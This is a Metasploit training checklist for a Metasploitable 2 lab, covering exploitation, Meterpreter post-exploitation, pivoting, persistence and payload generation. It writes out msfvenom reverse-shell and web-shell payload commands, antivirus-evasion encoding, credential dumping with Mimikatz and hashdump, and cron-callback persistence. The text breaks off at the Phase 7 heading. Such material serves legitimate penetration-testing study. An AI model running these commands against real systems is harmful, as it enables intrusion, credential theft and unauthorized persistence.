# 💀 Metasploit Framework: Complete Mastery Checklist

> **What is Metasploit?** The Metasploit Framework is the world's most used penetration testing and exploitation framework. It provides a structured way to discover vulnerabilities, develop and execute exploits, deliver payloads, establish persistent access, and pivot through networks — all from a single unified console.
>
> **Why does it exist?** Before Metasploit, exploiting a vulnerability required finding raw exploit code, modifying it for your target, handling shellcode manually, and dealing with countless compatibility issues. Metasploit standardized all of this into modules: pick an exploit, pick a payload, set options, run.
>
> **When to use it:** After discovery and enumeration, when you've identified potentially vulnerable services and need to validate exploitability. Exploitation phase of pentests. Post-exploitation (Meterpreter), pivoting, persistence, credential harvesting. CTF challenges. Payload generation (msfvenom).
>
> **When to avoid it:** During stealth-focused red team engagements (Metasploit traffic is signatured by every modern IDS/AV). When a simpler manual exploit exists. When you don't have authorization. For web application testing (Burp Suite is better).
>
> **What mastering Metasploit unlocks:** Efficient exploitation and post-exploitation. OSCP certification readiness. Understanding of the full exploit-payload-handler architecture. Ability to validate vulnerabilities with proof-of-exploitation. Pivoting through complex network topologies.

---

## 🧭 Navigation

- 📋 [Master Roadmap](../Roadmap/README.md)
- 🐧 [Metasploitable 2 Lab](../Lab/Metasploitable_2/TASK_LIST.md)
- 🗺️ [Nmap Guide](Nmap.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals & Architecture | 6 | 3–4 hours |
| 2 | Core Exploitation Workflow | 8 | 6–9 hours |
| 3 | Intermediate (Post-Exploitation, Pivoting) | 7 | 6–8 hours |
| 4 | Advanced (Custom Modules, Evasion) | 5 | 6–8 hours |
| 5 | Tool Integration | 5 | 3–5 hours |
| 6 | Practical Labs | 5 | 8–14 hours |
| 7 | Methodology & Engagement Usage | 4 | 3–4 hours |
| 8 | Mastery Challenges | 4 | 8–12 hours |
| | **Total** | **44** | **~43–64 hours** |

**Prerequisites:** Nmap scanning proficiency. Networking fundamentals. Linux CLI basics. Understanding of vulnerabilities and CVEs. A vulnerable target (Metasploitable 2).

**Alternatives:** Cobalt Strike (commercial, red team focused), Sliver (open-source C2), Havoc (modern C2), Empire/Starkiller (PowerShell post-exploitation), manual exploits (standalone scripts from Exploit-DB).

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — Metasploit Architecture & Module Types

- [ ] **Completed** · ⭐ Beginner · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand Metasploit's modular architecture: **Exploits** (code that triggers a vulnerability), **Payloads** (code that runs after exploitation — singles, stagers, stages), **Auxiliary** (scanning, fuzzing, sniffing — no exploitation), **Post** (post-exploitation modules), **Encoders** (payload obfuscation), **Nops** (NOP sled generation), **Evasion** (AV evasion modules). |
| **Skills Learned** | Module hierarchy, the exploit→payload→handler pipeline, difference between singles (self-contained), stagers (small, downloads stage), and staged payloads (downloaded by stager), why architecture understanding matters for troubleshooting. |
| **Practical Exercise** | Draw a diagram: Exploit Module → sends payload → target executes payload → payload connects back to handler. List three examples of each module type. |
| **Expected Output** | Understanding of the full Metasploit pipeline. Ability to explain the difference between a staged and a non-staged payload. |
| **Common Mistakes** | Confusing exploits with payloads (the exploit triggers the vulnerability; the payload is what you want to run after). Not understanding staged vs stageless (staged = two-part delivery, stageless = single complete payload). Thinking Metasploit only does exploitation (auxiliary modules do scanning and enumeration). |

---

### Task 1.2 — msfconsole Navigation & Essentials

- [ ] **Completed** · ⭐ Beginner · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Navigate the msfconsole CLI interface fluently: searching modules, using help, setting global/local options, understanding the prompt changes, and using workspaces. |
| **Skills Learned** | `search`, `use`, `info`, `show options`, `show payloads`, `set`, `setg`, `run`/`exploit`, `back`, `sessions`, `help`, tab completion, command history. |
| **Practical Exercise** | Launch: `msfconsole`. Search: `search type:exploit platform:linux smb`. Use a module: `use exploit/unix/ftp/vsftpd_234_backdoor`. Show info: `info`. Show options: `show options`. Show compatible payloads: `show payloads`. Go back: `back`. |
| **Expected Output** | Comfortable msfconsole navigation. Understanding of the module context system (prompt shows active module). |
| **Common Mistakes** | Not using `search` effectively (use `search type:exploit name:apache platform:linux` for targeted results). Forgetting `show options` (every module has required options — set them all). Not using tab completion (saves time and prevents typos). |

---

### Task 1.3 — Database Setup & Workspace Management

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Initialize the Metasploit database (PostgreSQL) and use workspaces to organize engagements. Import Nmap scan results into the database for automatic target/service population. |
| **Skills Learned** | Database initialization (`msfdb init`), workspace management (`workspace -a <name>`, `workspace <name>`), importing scan data (`db_import`), querying hosts and services (`hosts`, `services`), database-driven exploitation. |
| **Practical Exercise** | `sudo msfdb init` → `msfconsole` → `db_status` (confirm connected). `workspace -a lab-msf2` → `db_import /path/to/nmap-scan.xml` → `hosts` (list imported hosts) → `services` (list imported services) → `services -p 445` (filter by port). |
| **Expected Output** | Database initialized. Workspace created. Nmap results imported. Hosts and services queryable from msfconsole. |
| **Common Mistakes** | Not initializing the database (many features silently fail without it). Not using workspaces (all engagement data mixes together). Not importing Nmap results (manually entering targets is slow and error-prone). |

---

### Task 1.4 — Understanding Payloads: Staged vs Stageless

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand the critical difference between staged and stageless payloads. Know when to use each and why the wrong choice causes exploits to fail. |
| **Skills Learned** | Staged payloads (`windows/meterpreter/reverse_tcp` — note the `/`): small stager connects back, downloads the full Meterpreter DLL. Stageless (`windows/meterpreter_reverse_tcp` — note the `_`): entire payload in one binary, larger but more reliable. Listeners: staged requires `exploit/multi/handler`; stageless works with `nc` or `multi/handler`. |
| **Practical Exercise** | Generate both: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe -o staged.exe`. `msfvenom -p windows/meterpreter_reverse_tcp LHOST=x LPORT=4444 -f exe -o stageless.exe`. Compare file sizes. Try catching the staged payload with `nc` (it fails) vs `multi/handler` (it works). |
| **Expected Output** | Understanding that staged payloads are smaller but require a Metasploit handler. Stageless payloads are larger but more portable. Correct file size comparison documented. |
| **Common Mistakes** | Using a staged payload with a plain Netcat listener (fails — Netcat can't handle the staging protocol). Using the wrong payload name (one slash = staged, underscore = stageless). Not understanding why exploits fail silently (often a staged/stageless mismatch with the handler). |

---

### Task 1.5 — msfvenom: Payload Generation

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Generate standalone payloads with msfvenom for delivery outside of Metasploit's exploit modules. This is how you create executable backdoors, web shells, and shellcode. |
| **Skills Learned** | msfvenom syntax, output formats (`-f exe, elf, raw, python, c, asp, jsp, war, php, ps1`), platform/architecture selection, encoder usage, payload listing. |
| **Practical Exercise** | Linux reverse shell: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o reverse_shell`. Windows Meterpreter: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o meterpreter.exe`. PHP web shell: `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php`. List all payloads: `msfvenom --list payloads | grep linux`. |
| **Expected Output** | Multiple payload files in different formats. Understanding of when to use each format (exe for Windows, elf for Linux, war for Tomcat, php for web upload). |
| **Common Mistakes** | Wrong architecture (x86 payload on x64 target — often works but not always). Wrong LHOST (using target IP instead of attacker IP). Wrong format for the target (exe on Linux doesn't work). Not setting up the handler BEFORE delivering the payload. |

---

### Task 1.6 — The multi/handler Listener

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Set up the `exploit/multi/handler` module to receive connections from generated payloads. This is the universal listener for all Metasploit payloads. |
| **Skills Learned** | Handler configuration, matching handler payload to generated payload (MUST be identical), `ExitOnSession false` for persistent listening, `LHOST 0.0.0.0` to listen on all interfaces, handler as a background job. |
| **Practical Exercise** | `use exploit/multi/handler` → `set payload linux/x86/shell_reverse_tcp` → `set LHOST 0.0.0.0` → `set LPORT 4444` → `set ExitOnSession false` → `exploit -j` (run as background job). Deliver the matching payload to target → observe session received. |
| **Expected Output** | Handler listening in the background. Session received when payload executes on target. `sessions -l` showing active sessions. |
| **Common Mistakes** | Payload mismatch between handler and generated payload (most common failure — they MUST be identical). Not using `exploit -j` (without `-j`, the handler blocks the console). LPORT mismatch. Not setting `ExitOnSession false` (handler dies after first connection). Firewall on attacker blocking the incoming connection. |

---

# PHASE 2: CORE EXPLOITATION

---

### Task 2.1 — First Exploit: vsftpd 2.3.4 Backdoor

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Exploit the vsftpd 2.3.4 backdoor on Metasploitable 2. This is the simplest Metasploit exploit — perfect for learning the workflow without complexity. |
| **Skills Learned** | The complete exploit workflow: `search` → `use` → `show options` → `set RHOSTS` → `exploit`. Understanding that this backdoor opens a root shell on port 6200 when triggered by a username containing `:)`. |
| **Practical Exercise** | `search vsftpd` → `use exploit/unix/ftp/vsftpd_234_backdoor` → `set RHOSTS <target>` → `exploit`. Interact with the resulting shell. Run `id`, `whoami`, `hostname`. |
| **Expected Output** | Root shell on the target. Understanding of the full exploitation workflow from search to shell. |
| **Common Mistakes** | Not checking `show options` for required parameters. Not understanding what the exploit actually does (research the CVE). Not stabilizing the shell after exploitation (raw shell — no PTY). |

---

### Task 2.2 — Exploiting Samba (usermap_script)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Exploit the Samba username map script vulnerability (CVE-2007-2447) on Metasploitable 2 using a command injection via the SMB username field. |
| **Practical Exercise** | `search samba usermap` → `use exploit/multi/samba/usermap_script` → `set RHOSTS <target>` → `show payloads` → `set payload cmd/unix/reverse` → `set LHOST <attacker>` → `exploit`. |
| **Expected Output** | Root shell via Samba exploitation. Understanding that this exploit injects commands through the SMB username field. |

---

### Task 2.3 — Exploiting Java RMI & Tomcat

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Exploit Java-based services on Metasploitable 2: Java RMI registry (port 1099) and Apache Tomcat manager (port 8180). Use Meterpreter payloads instead of basic shells. |
| **Practical Exercise** | RMI: `use exploit/multi/misc/java_rmi_server` → configure and exploit. Tomcat: `use exploit/multi/http/tomcat_mgr_upload` → `set HttpUsername tomcat` → `set HttpPassword tomcat` → `set payload java/meterpreter/reverse_tcp` → exploit. |
| **Expected Output** | Meterpreter session on the target. First experience with Meterpreter's capabilities vs a basic shell. |

---

### Task 2.4 — Meterpreter Basics

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 45 min

| Field | Detail |
|:---|:---|
| **Objective** | Master essential Meterpreter commands for post-exploitation: system info, process management, file operations, networking, screenshot capture, and session management. |
| **Skills Learned** | `sysinfo`, `getuid`, `getpid`, `ps`, `migrate <PID>`, `upload`/`download`, `shell` (drop to OS shell), `background` (put session in background), `hashdump`, `search -f *.txt`, `screenshot`, `keyscan_start`/`keyscan_dump`, `portfwd`, `route`. |
| **Practical Exercise** | From a Meterpreter session: `sysinfo` → `getuid` → `ps` → `shell` (get OS shell, then `exit` back to Meterpreter) → `download /etc/passwd /tmp/` → `upload /tmp/linpeas.sh /tmp/` → `search -f *.conf`. |
| **Expected Output** | System enumeration data collected. Files uploaded and downloaded. Shell access obtained. Understanding of Meterpreter as a full post-exploitation toolkit. |
| **Common Mistakes** | Not using `migrate` to move to a stable process (if the exploited process dies, you lose the session). Not backgrounding sessions (`background` or Ctrl+Z) — you can have multiple sessions. Trying to run Linux commands directly in Meterpreter (use `shell` first, or prefix with `execute -f`). |

---

### Task 2.5 — Exploit Selection & Research

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Given Nmap scan results, systematically identify potential exploits: search by service name and version, evaluate exploit quality (rank, disclosure date, reliability), and choose the best option. |
| **Skills Learned** | `search` with filters (`search type:exploit name:apache rank:excellent`), exploit ranking system (manual, excellent, great, good, normal, average, low), `info` for exploit details, checking exploit compatibility with target OS/architecture, Exploit-DB cross-referencing. |
| **Practical Exercise** | From Nmap results, pick three services. For each: `search` for exploits → `info` on candidates → evaluate rank and description → select the best one → document why you chose it. |
| **Expected Output** | Documented exploit selection process for three services. Understanding of exploit ranks and why "excellent" and "great" are preferred. |
| **Common Mistakes** | Using the first exploit found without reading `info` (some exploits are unreliable or destructive). Not checking the target platform (Windows exploit won't work on Linux). Not checking the exploit's required conditions (some need credentials, specific configurations, or network access). |

---

### Task 2.6 — Auxiliary Modules: Scanning & Enumeration

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Metasploit's auxiliary modules for scanning and enumeration — NOT exploitation. These modules gather intelligence: service versions, credentials, shares, users, and vulnerabilities. |
| **Skills Learned** | Auxiliary module usage for SMB enumeration (`auxiliary/scanner/smb/smb_enumshares`, `smb_enumusers`, `smb_version`), SSH version scanning, FTP anonymous login check, HTTP directory scanning, database-driven scanning with `db_nmap`. |
| **Practical Exercise** | `use auxiliary/scanner/smb/smb_version` → `set RHOSTS <target>` → `run`. `use auxiliary/scanner/ftp/anonymous` → `set RHOSTS <target>` → `run`. `use auxiliary/scanner/ssh/ssh_version` → `set RHOSTS <target>` → `run`. |
| **Expected Output** | Service version and configuration details gathered through auxiliary modules. Comparison with Nmap results (Metasploit may find additional details). |
| **Common Mistakes** | Ignoring auxiliary modules (they're extremely useful for targeted enumeration). Not setting RHOSTS (common error). Running auxiliary modules against wrong ports (check `show options` for RPORT). |

---

### Task 2.7 — Session Management & Upgrading Shells

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Manage multiple sessions: list, interact, background, kill, rename, and upgrade basic command shells to Meterpreter sessions. |
| **Skills Learned** | `sessions -l` (list), `sessions -i <ID>` (interact), `sessions -u <ID>` (upgrade to Meterpreter), `sessions -k <ID>` (kill), `sessions -K` (kill all), backgrounding with Ctrl+Z or `background`. |
| **Practical Exercise** | Get a basic shell via an exploit → `background` → `sessions -l` → `sessions -u <ID>` (upgrade to Meterpreter) → `sessions -i <new-ID>` (interact with upgraded session) → `sysinfo`. |
| **Expected Output** | Multiple sessions managed simultaneously. A basic shell upgraded to Meterpreter. Understanding that Meterpreter is significantly more capable than a basic shell. |
| **Common Mistakes** | Not upgrading shells to Meterpreter (losing access to post-exploitation modules). Forgetting to background sessions before using another module. Killing the wrong session (always verify with `sessions -l` first). |

---

### Task 2.8 — Post-Exploitation Modules

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Metasploit's post-exploitation modules for systematic information gathering from a compromised host: system enumeration, credential harvesting, network discovery, and evidence collection. |
| **Skills Learned** | Post modules organized by OS (`post/linux/gather/*`, `post/windows/gather/*`), running post modules against sessions, `run post/linux/gather/enum_system` for Linux enumeration, credential gathering, network interface discovery. |
| **Practical Exercise** | From an active session: `run post/linux/gather/enum_system` → `run post/linux/gather/enum_network` → `run post/linux/gather/hashdump` → `run post/multi/gather/ssh_creds`. |
| **Expected Output** | System details, network configuration, user credentials gathered through post-exploitation modules. Understanding of systematic post-exploitation methodology. |
| **Common Mistakes** | Not using post modules (manually running commands is slower and less thorough). Running Windows post modules on Linux targets (and vice versa). Not specifying the correct SESSION option. |

---

# PHASE 3: INTERMEDIATE TECHNIQUES

---

### Task 3.1 — Pivoting with Metasploit Routes

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 45 min

| Field | Detail |
|:---|:---|
| **Objective** | Use a compromised host as a pivot to access internal networks. Set up routes through Meterpreter sessions to scan and exploit hosts that aren't directly reachable from your attacker machine. |
| **Skills Learned** | `route add <subnet> <session>`, autoroute post module, SOCKS proxy via `auxiliary/server/socks_proxy`, proxychains configuration, scanning through pivots, the concept of "lateral movement." |
| **Practical Exercise** | From Meterpreter: `run autoroute -s 10.10.10.0/24` (route internal subnet through session). Back in msfconsole: `use auxiliary/scanner/portscan/tcp` → `set RHOSTS 10.10.10.0/24` → `run` (scan internal network through the pivot). For browser access: `use auxiliary/server/socks_proxy` → `set SRVPORT 1080` → `run -j` → configure proxychains → `proxychains nmap -sT -Pn 10.10.10.1`. |
| **Expected Output** | Internal network reachable through the pivot. Port scan results for internal hosts. Understanding of how routing and SOCKS proxies enable lateral movement. |
| **Common Mistakes** | Not using `autoroute` (trying to manually route is error-prone). Forgetting that scans through pivots must use `-sT` (no raw sockets through SOCKS). Not setting up the SOCKS proxy for tools outside Metasploit. |

---

### Task 3.2 — Port Forwarding with Meterpreter

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Meterpreter's `portfwd` to forward local ports to internal services through a compromised host. This allows you to use local tools against internal services. |
| **Skills Learned** | `portfwd add -l <localport> -p <remoteport> -r <internal-target>`, local vs remote port forwarding, accessing internal web servers and databases through forwards. |
| **Practical Exercise** | From Meterpreter: `portfwd add -l 8888 -p 80 -r 10.10.10.5`. Now on attacker: `curl http://127.0.0.1:8888` accesses the internal web server at 10.10.10.5:80. |
| **Expected Output** | Internal services accessible through local port forwards. Browser able to access internal web applications. |
| **Common Mistakes** | Local port already in use (choose a different port). Forgetting which forward goes where (use `portfwd list` to check). Not cleaning up forwards when done (`portfwd delete` or `portfwd flush`). |

---

### Task 3.3 — Credential Harvesting & Hash Dumping

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Extract credentials from compromised systems: Linux password hashes (`/etc/shadow`), Windows SAM/NTLM hashes, cached credentials, and application-specific credentials. |
| **Skills Learned** | `hashdump` (Meterpreter), `post/linux/gather/hashdump`, `post/windows/gather/smart_hashdump`, hash format identification, understanding that hashes need to be cracked (Hashcat/John) or used for pass-the-hash attacks. |
| **Practical Exercise** | From Meterpreter on Metasploitable 2: `hashdump` → save the output → identify hash type → crack with John or Hashcat. `run post/linux/gather/enum_users_history` → check for credentials in command history. |
| **Expected Output** | Password hashes extracted. At least one hash cracked. Credential inventory started. |
| **Common Mistakes** | Not having sufficient privileges to dump hashes (need root/SYSTEM). Not saving hashes to a file (you need them for cracking). Not understanding the hash format (Linux `$6$` = SHA-512, Windows NTLM = 32-char hex). |

---

### Task 3.4 — Persistence Mechanisms

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Install persistence mechanisms on a compromised host so you can regain access if the initial session dies. Understand both the attacker's and defender's perspective. |
| **Skills Learned** | Cron-based persistence (Linux), service-based persistence, SSH key persistence, `run persistence` module (legacy), `exploit/linux/local/service_persistence`, why persistence is a core pentest phase, how defenders detect persistence. |
| **Practical Exercise** | From a session: add your SSH public key to `~/.ssh/authorized_keys`. Create a cron job that calls back to your listener every 5 minutes. Then — as a defender — find and remove both persistence mechanisms. |
| **Expected Output** | Multiple persistence mechanisms installed and tested. Ability to regain access after the original session dies. Detection and removal documentation. |
| **Common Mistakes** | Using only one persistence mechanism (if it's detected, you lose access). Not testing persistence before moving on (verify the callback works). Not documenting persistence for the report (clients need to know what you installed so they can remove it). Forgetting to clean up at the end of the engagement. |

---

### Task 3.5 — Local Privilege Escalation via Metasploit

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Metasploit's local exploit modules to escalate from a low-privilege user to root/SYSTEM. Understand the `local_exploit_suggester` for automated enumeration. |
| **Skills Learned** | `post/multi/recon/local_exploit_suggester` (scans session for applicable local exploits), `exploit/linux/local/*` modules, setting the SESSION option, understanding that local exploits run through existing sessions. |
| **Practical Exercise** | From a low-privilege session: `run post/multi/recon/local_exploit_suggester` → review suggestions → `use exploit/linux/local/<suggested>` → `set SESSION <id>` → `set LHOST <attacker>` → `exploit`. |
| **Expected Output** | Privilege escalation from low-privilege to root. Understanding of the local exploit workflow (exploit runs through an existing session, not directly against a port). |
| **Common Mistakes** | Forgetting to set the SESSION option (local exploits need an existing session). Not running `local_exploit_suggester` first (saves time over manual searching). Exploit architecture mismatch (x86 session can't run x64 local exploits). |

---

### Task 3.6 — Custom Resource Scripts (.rc Files)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Create resource scripts (.rc files) to automate repetitive msfconsole workflows: handler setup, multi-target exploitation, post-exploitation enumeration. |
| **Skills Learned** | Resource script syntax (plain text, one command per line), `resource <file.rc>` to execute, `makerc <file.rc>` to save current session as a script, automating handler+payload combinations, multi-stage automation. |
| **Practical Exercise** | Create `handler.rc`: `use exploit/multi/handler\nset payload linux/x86/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nset ExitOnSession false\nexploit -j`. Launch: `msfconsole -r handler.rc`. Create `enum.rc` for post-exploitation enumeration of a session. |
| **Expected Output** | Resource scripts automating common workflows. One-command launch of complex setups. |
| **Common Mistakes** | Hardcoding IP addresses (use variables or parameterize). Not using `makerc` to save useful sessions as scripts. Not testing scripts before relying on them in engagements. |

---

### Task 3.7 — Database Queries & Credential Management

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Metasploit's database to track discovered hosts, services, vulnerabilities, credentials, and looted data across an engagement. |
| **Skills Learned** | `hosts` (list hosts with OS info), `services` (list discovered services), `vulns` (list confirmed vulnerabilities), `creds` (list harvested credentials), `loot` (list exfiltrated data), filtering and exporting database contents. |
| **Practical Exercise** | After running several exploits and post modules: `hosts` → `services -p 22,80,445` → `vulns` → `creds` → `loot`. Export: `hosts -o /tmp/hosts.csv`. |
| **Expected Output** | Complete engagement database showing all hosts, services, vulnerabilities, and credentials. Understanding that the database is your engagement's single source of truth. |

---

# PHASE 4: ADVANCED USAGE

---

### Task 4.1 — Writing Custom Metasploit Modules

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| Field | Detail |
|:---|:---|
| **Objective** | Read, understand, and create a simple custom Metasploit module (auxiliary scanner or exploit). Understand the Ruby module structure, mixins, and API. |
| **Skills Learned** | Ruby basics for Metasploit, module skeleton structure, Msf::Exploit::Remote mixin, `register_options`, `exploit`/`run` methods, datastore access, module documentation. |
| **Practical Exercise** | Read an existing simple module (e.g., `modules/auxiliary/scanner/http/http_version.rb`). Modify it to add additional functionality. Write a simple auxiliary module that connects to a port and checks for a specific banner. Place in `~/.msf4/modules/`. |
| **Expected Output** | Custom module loaded and functional in msfconsole. Understanding of the module API. |

---

### Task 4.2 — AV/IDS Evasion with msfvenom

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Use msfvenom encoders, custom templates, and evasion techniques to generate payloads that bypass basic AV detection. Understand the limitations of these techniques against modern AV/EDR. |
| **Skills Learned** | Encoder usage (`-e x86/shikata_ga_nai`), iteration count (`-i 5`), custom templates (`-x`), `msfvenom --list encoders`, evasion modules, understanding that encoding alone rarely bypasses modern AV. |
| **Practical Exercise** | Generate a payload with encoding: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe`. Test against VirusTotal (use a hash check, don't upload — uploading shares with AV vendors). Compare detection rates with/without encoding. |
| **Expected Output** | Encoded payloads generated. Understanding that basic encoding is insufficient against modern AV (custom loaders, process injection, or completely custom payloads are needed). |
| **Common Mistakes** | Thinking `shikata_ga_nai` bypasses all AV (it hasn't since ~2015). Uploading payloads to VirusTotal (this shares them with every AV vendor — use hash lookups instead). Not understanding that modern evasion requires custom tooling beyond Metasploit's built-in encoders. |

---

### Task 4.3 — Metasploit for Windows Exploitation

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Metasploit for Windows-specific exploitation: EternalBlue (MS17-010), psexec, pass-the-hash, token impersonation, and Mimikatz integration. |
| **Skills Learned** | `exploit/windows/smb/ms17_010_eternalblue`, `exploit/windows/smb/psexec` (with hash or password), `post/windows/gather/smart_hashdump`, `load kiwi` (Mimikatz in Meterpreter), token manipulation (`use incognito`, `list_tokens`, `impersonate_token`). |
| **Practical Exercise** | (Requires a Windows target) EternalBlue: `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS <target>` → `set payload windows/x64/meterpreter/reverse_tcp` → exploit. From Meterpreter: `load kiwi` → `creds_all`. |
| **Expected Output** | SYSTEM-level Meterpreter on Windows. Credentials extracted via Mimikatz. Understanding of Windows-specific post-exploitation. |

---

### Task 4.4 — Metasploit API & Automation (msfrpc)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Use the Metasploit RPC API (msfrpcd) for programmatic control: launching modules, managing sessions, and retrieving results from external scripts. |
| **Skills Learned** | `msfrpcd -P <password>` to start the RPC daemon, Python `pymetasploit3` library for API access, launching exploits programmatically, session management via API. |
| **Expected Output** | Programmatic exploit launch and session management from a Python script. Understanding of Metasploit automation capabilities. |

---

### Task 4.5 — Metasploit in CTF Environments

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Metasploit efficiently in CTF settings: quick exploitation, time-boxed testing, when to use Metasploit vs manual exploits (OSCP limits Metasploit to one machine). |
| **Key Considerations** | OSCP exam allows Metasploit on only ONE machine. CTFs may or may not allow Metasploit. Speed vs learning: Metasploit is fast but you learn more from manual exploitation. Always have a manual exploitation capability as a backup. |

---

# PHASE 5: TOOL INTEGRATION

---

### Task 5.1 — Nmap → Metasploit: Complete Pipeline

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| **Workflow** | `nmap -sV -sC -oX scan.xml <target>` → `msfconsole` → `db_import scan.xml` → `services -p 445` → `search smb` → `use` → `set RHOSTS` → `exploit`. |

---

### Task 5.2 — Metasploit + Hashcat/John: Credential Cracking

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| **Workflow** | `hashdump` in Meterpreter → save hashes to file → `john hashes.txt --format=sha512crypt --wordlist=rockyou.txt` or `hashcat -m 1800 hashes.txt rockyou.txt`. |

---

### Task 5.3 — Metasploit + LinPEAS: Post-Exploitation Enum

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| **Workflow** | Meterpreter → `upload linpeas.sh /tmp/` → `shell` → `chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh` → review output for privilege escalation vectors. |

---

### Task 5.4 — Metasploit + Netcat: Mixed Shell Handling

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Workflow** | Use Metasploit for exploitation, but catch the shell with Netcat for simplicity: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=x LPORT=4444 -f elf -o shell` → `nc -lvnp 4444` (catches the stageless shell). |

---

### Task 5.5 — Metasploit + Burp Suite: Web Exploitation

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| **Workflow** | Burp identifies web vulnerability → Metasploit exploits it. Example: Burp finds Tomcat manager with default credentials → Metasploit's `tomcat_mgr_upload` deploys a WAR shell. Burp finds command injection → Metasploit generates a payload → inject via Burp. |

---

# PHASE 6: PRACTICAL LABS

---

### Lab 6.1 — Beginner: Exploit Three Services on Metasploitable 2

- [ ] **Completed** · ⭐⭐ Beginner · ⏱️ 90 min

| **Scenario** | Exploit at least three different services on Metasploitable 2 using Metasploit modules. |
| **Success Criteria** | Three shells obtained via three different exploits. Each exploit documented with full workflow. |

---

### Lab 6.2 — Intermediate: Full Post-Exploitation Cycle

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 90 min

| **Scenario** | Exploit a service → upgrade to Meterpreter → enumerate system → dump credentials → crack hashes → install persistence → verify persistence. |
| **Success Criteria** | Complete post-exploitation cycle documented. Credentials cracked. Persistence verified. |

---

### Lab 6.3 — Advanced: Pivoting Lab

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 120 min

| **Scenario** | Set up two VMs: one directly reachable, one on an internal-only network. Compromise the first, set up routing/pivoting, and exploit the second through the first. |
| **Success Criteria** | Shell on internal machine obtained through pivot. Complete network diagram and attack path documented. |

---

### Lab 6.4 — Advanced: msfvenom Payload Lab

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | Generate payloads in five different formats (ELF, EXE, PHP, Python, WAR). Deliver each to the appropriate target service. Catch each with multi/handler. |
| **Success Criteria** | Five payloads generated, delivered, and caught. Understanding of format selection based on target. |

---

### Lab 6.5 — Expert: Automated Exploitation Framework

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 180 min

| **Scenario** | Write a resource script or Python automation that: imports Nmap scan → identifies vulnerable services → launches appropriate exploits → manages sessions → runs post-exploitation → generates a report. |
| **Success Criteria** | Automated pipeline from scan to report. Error handling for failed exploits. Clean report output. |

---

# PHASE 7: METHODOLOGY

---

### Task 7.1 — Metasploit in the PTES Framework

